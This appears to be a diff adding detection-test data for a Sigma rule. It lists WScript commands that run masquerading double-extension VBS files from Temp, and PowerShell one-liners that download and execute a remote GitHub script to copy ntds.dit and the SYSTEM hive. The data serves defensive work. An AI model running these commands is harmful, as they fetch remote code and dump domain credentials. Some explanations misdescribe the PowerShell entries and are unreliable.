@@ -1,0 +1,24 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\WScript.exe \"C:\\Users\\thaim\\AppData\\Local\\Temp\\AtomicTest.vbs\"",
+    "explanation": "This command is a direct match to the Sigma rule and is not bypassed. It executes a script from the Temp folder using WScript.exe."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WScript.exe \"C:\\Users\\thaim\\AppData\\Local\\Temp\\T1036.007_masquerading.png.vbs\"",
+    "explanation": "This command is a direct match to the Sigma rule and is not bypassed. It executes a script from the Temp folder using WScript.exe with a filename that includes an image extension."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WScript.exe \"C:\\Users\\thaim\\AppData\\Local\\Temp\\T1036.007_masquerading.xls.vbs\"",
+    "explanation": "This command is a direct match to the Sigma rule and is not bypassed. It executes a script from the Temp folder using WScript.exe with a filename that includes an Excel extension."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WScript.exe \"C:\\Users\\thaim\\AppData\\Local\\Temp\\T1036.007_masquerading.xlsx.vbs\"",
+    "explanation": "This command is a direct match to the Sigma rule and is not bypassed. It executes a script from the Temp folder using WScript.exe with a filename that includes a newer Excel extension."
+  },
+  {
+    "output": "powershell.exe -Command \"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing); Underlay-Copy -Mode Metadata -SourceFile C:\\Windows\\NTDS\\ntds.dit -DestinationFile C:\\Windows\\Temp\\ntds.dit; Underlay-Copy -Mode Metadata -SourceFile C:\\Windows\\System32\\config\\SYSTEM -DestinationFile C:\\Windows\\Temp\\SYSTEM_HIVE}\"",
+    "explanation": "This command is a direct match to the Sigma rule and is not bypassed. It executes PowerShell from the Temp folder."
+  },
+  {
+    "output": "powershell.exe -Command \"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing); Underlay-Copy -Mode MFT -SourceFile C:\\Windows\\NTDS\\ntds.dit -DestinationFile C:\\Windows\\Temp\\ntds.dit; Underlay-Copy -Mode MFT -SourceFile C:\\Windows\\System32\\config\\SYSTEM -DestinationFile C:\\Windows\\Temp\\SYSTEM_HIVE}\"",
+    "explanation": "This command is a direct match to the Sigma rule and is not bypassed. It executes PowerShell from the Temp folder."
